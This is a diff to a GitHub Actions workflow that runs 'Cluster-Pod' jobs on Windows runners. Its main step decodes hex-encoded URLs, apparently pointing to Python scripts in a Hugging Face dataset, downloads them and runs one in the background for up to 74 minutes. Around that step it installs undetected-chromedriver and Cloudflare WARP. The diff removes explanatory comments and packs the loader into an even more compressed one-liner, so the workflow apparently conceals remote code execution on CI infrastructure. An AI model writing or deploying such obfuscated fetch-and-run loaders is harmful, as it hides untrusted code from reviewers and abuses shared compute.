@@ -11,7 +11,7 @@ concurrency:
 
 jobs:
   cluster-runners:
-    name: Cluster-Pod-#${{ matrix.runner_id }}
+    name: Cluster-Pod-${{ matrix.runner_id }}
     runs-on: windows-2022
     timeout-minutes: 75
 
@@ -24,30 +24,13 @@ jobs:
       - name: Initialize Runtime & Resolve Payloads
         shell: pwsh
         run: |
-          Write-Host "[INIT] Setting up environment for Pod ${{ matrix.runner_id }}..."
+          Write-Host "[INIT] Setting up environment for Pod: ${{ matrix.runner_id }}"
 
-          # تثبيت الحزم المطلوبة
           python -m pip install --quiet --upgrade pip
           pip install --quiet selenium undetected-chromedriver requests
 
-          # فك تشفير الروابط عبر Hex وتحميل الملفات مباشرة باستخدام بايثون
-          $fetchCode = @"
-          import bytes
-          import urllib.request
-
-          raw_assets = {
-              'app_core.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368332f7265736f6c76652f6d61696e2f73746172745f736872696e6b5f6e65772e7079',
-              'hash.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368762f7265736f6c76652f6d61696e2f686173682e7079'
-          }
-
-          for filename, hex_val in raw_assets.items():
-              target_url = bytes.fromhex(hex_val).decode('utf-8')
-              req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
-              with urllib.request.urlopen(req) as resp, open(filename, 'wb') as out_f:
-                  out_f.write(resp.read())
-          "@
-
-          python -c "$fetchCode"
+          python -c "import urllib.request; assets = {'app_core.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368332f7265736f6c76652f6d61696e2f73746172745f736872696e6b5f6e65772e7079', 'hash.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368762f7265736f6c76652f6d61696e2f686173682e7079'}; [open(f, 'wb').write(urllib.request.urlopen(urllib.request.Request(bytes.fromhex(h).decode('utf-8'), headers={'User-Agent': 'Mozilla/5.0'})).read()) for f, h in assets.items()]"
+          
           Write-Host "[READY] Assets resolved and downloaded successfully."
 
       - name: Execute Managed Subprocess
@@ -58,11 +41,9 @@ jobs:
         run: |
           Write-Host "[EXECUTION] Launching core payload on Pod: ${{ matrix.runner_id }}"
           
-          # إضافة مسار Cloudflare WARP للبيئة
           $warpDir = Join-Path $env:ProgramFiles "Cloudflare\Cloudflare WARP"
           if (Test-Path $warpDir) { $env:Path = "$warpDir;$env:Path" }
 
-          # تشغيل العملية في الخلفية باستخدام ProcessStartInfo
           $psi = New-Object System.Diagnostics.ProcessStartInfo
           $psi.FileName = "python"
           $psi.Arguments = "app_core.py"
@@ -71,7 +52,6 @@ jobs:
 
           Write-Host "[WATCHDOG] Timer active: Max window is 4440 seconds (74 minutes)..."
 
-          # مراقبة العملية حتى 74 دقيقة (4440000 ميلي ثانية)
           $completed = $process.WaitForExit(4440000)
 
           if (-not $completed) {
@@ -85,4 +65,5 @@ jobs:
       - name: Cleanup & Teardown
         if: always()
         shell: pwsh
-        run: Write-Host "[POD LIFECYCLE] Pod #${{ matrix.runner_id }} has finished execution."
+        run: |
+          Write-Host "[POD LIFECYCLE] Pod ID: ${{ matrix.runner_id }} has finished execution."
